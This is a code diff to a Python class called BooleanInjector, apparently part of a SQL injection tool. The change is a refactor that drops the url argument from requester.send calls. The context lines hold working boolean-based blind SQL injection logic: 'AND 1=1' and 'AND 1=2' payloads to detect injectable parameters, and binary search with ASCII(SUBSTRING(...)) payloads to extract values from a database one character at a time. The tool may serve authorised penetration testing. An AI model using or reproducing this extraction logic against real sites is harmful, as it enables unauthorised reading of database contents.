@@ -32,9 +32,9 @@ class BooleanInjector:
         responses differ, the parameter is likely injectable.
         """
 
-        r_true = self.requester.send(url, {param: f"{ctx.prefix}AND 1=1{ctx.suffix}"})
+        r_true = self.requester.send({param: f"{ctx.prefix}AND 1=1{ctx.suffix}"})
 
-        r_false = self.requester.send(url, {param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
+        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
 
         return self.analyzer.responses_differ(r_true, r_false, DIFFER_LENGTH_BOOL)
 
@@ -47,7 +47,7 @@ class BooleanInjector:
 
         # Baseline for a query containing a false condition. If another response differs from this,
         # it would probably mean that the tested condition is true.
-        r_false = self.requester.send(url, {param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
+        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
         # Logger.debug(r_false.body)
 
         # Initial range
@@ -59,7 +59,7 @@ class BooleanInjector:
 
             # To check if the name length is higher to the current mid value
             payload = f"{ctx.prefix}AND {expression}>{mid}{ctx.suffix}"
-            response = self.requester.send(url, {param: payload})
+            response = self.requester.send({param: payload})
             # If different then the condition is right
             # Logger.debug(f"Diff len: {diff_len}")
 
@@ -90,7 +90,7 @@ class BooleanInjector:
 
         # Baseline for a query containing a false condition. If another response differs from this,
         # it would probably mean that the tested condition is true.
-        r_false = self.requester.send(url, {param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
+        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
 
         for digit in range(1, expr_name_len + 1):
             low = 32
@@ -100,7 +100,7 @@ class BooleanInjector:
                 mid = (low + high) // 2
 
                 payload = f"{ctx.prefix}AND ASCII(SUBSTRING({expression},{digit},1))>{mid}{ctx.suffix}"
-                response = self.requester.send(url, {param: payload})
+                response = self.requester.send({param: payload})
 
                 # If different then the condition is right
 
@@ -132,7 +132,7 @@ class BooleanInjector:
         found_chars: list[str] = []
         # Baseline for a query containing a false condition. If another response differs from this,
         # it would probably mean that the tested condition is true.
-        r_false = self.requester.send(url, {param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
+        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
 
         for digit in range:
             # We will test against ASCII characters from number 32 (SPACE) to 126 (TILDE)
@@ -142,7 +142,7 @@ class BooleanInjector:
                 mid = (low + high) // 2
 
                 payload = f"{ctx.prefix}AND ASCII(SUBSTRING({expression},{digit},1))>{mid}{ctx.suffix}"
-                response = self.requester.send(url, {param: payload})
+                response = self.requester.send({param: payload})
 
                 # Add the length of the payload as baseline response doesn't contain expression
                 diff_len = DIFFER_LENGTH_BOOL + len(payload)
